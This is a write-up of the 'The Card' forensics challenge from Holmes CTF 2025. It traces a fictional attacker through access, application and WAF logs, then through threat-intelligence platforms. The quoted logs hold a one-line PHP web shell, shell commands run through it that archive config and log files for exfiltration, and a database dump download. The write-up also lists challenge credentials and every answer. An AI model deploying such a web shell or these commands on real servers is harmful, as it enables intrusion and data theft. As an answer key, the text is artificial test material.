---
title: "Holmes CTF 2025 - The Card"
date: 2025-09-27T14:20:00+07:00
draft: false
categories: ["CTF", "writeup"]
cover: "/images/holmes_2025/the_card/anh1.png"
---

# Holmes CTF 2025 – The Card

![Challenge Banner](/images/holmes_2025/the_card/anh1.png)

Holmes CTF 2025 Event Link: https://ctf.hackthebox.com/event/2536  
Challenge name: **The Card**  
Difficulty: **Easy**  
Describe: Holmes receives a breadcrumb from Dr. Nicole Vale – fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.

---

## ❓ Question 1  
Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot. (string)

*From the provided snippet of the access.log, we can see the following entry:
```velocity
2025-05-01 08:23:12 121.36.37.224 - - [01/May/2025:08:23:12 +0000] 
"GET /robots.txt HTTP/1.1" 200 847 "-" "Lilnunc/4A4D - SpecterEye"
```

Breaking it down:
Timestamp: 2025-05-01 08:23:12  
Source IP: 121.36.37.224 (attacker)  
Request: GET /robots.txt HTTP/1.1  
Response code: 200 (successful request)  
User-Agent: "Lilnunc/4A4D - SpecterEye"  

Since this is the earliest recorded request from the attacker, the User-Agent value clearly indicates the tool or script they were using.

Conclusion:  
```velocity
Lilnunc/4A4D - SpecterEye
```

---

## ❓ Question 2:  
It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? (filename.ext)

Log Analysis:
1. Application log evidence
In application.log, we see that the attacker successfully deployed a backdoor web shell:
```velocity
2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by 121.36.37.224 - command: 'echo "<?php system($_GET["cmd"]); ?>" > /var/www/html/uploads/temp_4A4D.php'
2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by 121.36.37.224
```

This shows the exact filename and path of the malicious PHP web shell: `/uploads/temp_4A4D.php`

2. Access log confirmation
Later, the attacker starts interacting with the uploaded file:
```velocity
2025-05-18 15:02:12 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=ls -la /var/www/html/uploads/" ...
2025-05-18 15:02:23 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=whoami" ...
2025-05-18 15:02:34 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=tar -czf /tmp/exfil_4A4D.tar.gz /var/www/html/config/ /var/log/webapp/" ...
```

Here we clearly see the attacker executing system commands (ls, whoami, tar) through the PHP web shell.

3. WAF log observation
The WAF also detected this malicious activity but shows that the attacker bypassed protections:
```velocity
2025-05-15 11:25:12 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - PHP web shell temp_4A4D.php created
```

Conclusion:  
```velocity
temp_4A4D.php
```

---

## ❓ Question 3:  
The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated? (filename.ext)

Log Analysis:
1. Access log evidence
From the access.log, we can see the attacker downloading a large SQL file:
```velocity
2025-05-18 14:58:23 121.36.37.224 - - [18/May/2025:15:58:23 +0000] 
"GET /uploads/database_dump_4A4D.sql HTTP/1.1" 200 52428800 "-" "4A4D RetrieveR/1.0.0"
```

This indicates a successful download of the file `database_dump_4A4D.sql`.

2. Application log confirmation
The application log also records this exfiltration attempt:
```velocity
2025-05-18 14:58:23 [CRITICAL] webapp.security - Database dump accessed - database_dump_4A4D.sql downloaded by 121.36.37.224
```

3. WAF log validation
Finally, the WAF confirms the event, showing the attacker bypassed protections:
```velocity
2025-05-18 14:58:23 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: DATABASE_DOWNLOAD - Action: BYPASS - Database file download: database_dump_4A4D.sql
```

Conclusion:  
```velocity
database_dump_4A4D.sql
```

---

## ❓ Question 4:  
During the attack, a seemingly meaningless string seems to be recurring. Which one is it? (string)

Log Analysis:
Reviewing the logs across different stages of the attack, one specific string keeps showing up:
- User-Agent: `Lilnunc/4A4D - SpecterEye`  
- Web shell filename: `temp_4A4D.php`  
- Exfiltrated files: `backup_2025_4A4D.tar.gz`, `database_dump_4A4D.sql`, `config_4A4D.json`  
- Backdoor & persistence mechanisms: `/tmp/.system_update_4A4D`, SSH key named `backdoor_4A4D`

Across reconnaissance, exploitation, persistence, and exfiltration, the attacker consistently embeds the same marker.

Conclusion:  
```velocity
4A4D
```

---

## ❓ Question 5:  
OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.

![CTI Graph](/images/holmes_2025/the_card/anh2.png)

Analysis & Conclusion:  
```velocity
5
```

---

## ❓ Question 6:  
How many tools and malware in total are linked to the previously identified campaigns? (number)

Analysis & Conclusion:  
```velocity
9
```

---

## ❓ Question 7:  
It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash? (sha-256 hash)

![Malware Hash](/images/holmes_2025/the_card/anh3.png)

Conclusion:  
```velocity
7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
```

---

## ❓ Question 8:  
Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)

Analysis & Conclusion:  
```velocity
74.77.74.77
```

---

## ❓ Question 9:  
What is the full path of the file that the malware created to ensure its persistence on systems? (/path/filename.ext)

![Persistence Evidence](/images/holmes_2025/the_card/anh4.png)  
![Persistence File](/images/holmes_2025/the_card/anh5.png)

Conclusion:  
```velocity
/opt/lilnunc/implant/4a4d_persistence.sh
```

---

## ❓ Question 10:  
Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have?

![Open Ports](/images/holmes_2025/the_card/anh6.png)

Conclusion:  
```velocity
11
```

---

## ❓ Question 11:  
Which organization does the previously identified IP belong to? (string)

![Organization Evidence](/images/holmes_2025/the_card/anh7.png)

Conclusion:  
```velocity
SenseShield MSP
```

---

## ❓ Question 12:  
One of the exposed services displays a banner containing a cryptic message. What is it? (string)

![Service Banner](/images/holmes_2025/the_card/anh8.png)

Conclusion:  
```velocity
He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE
```
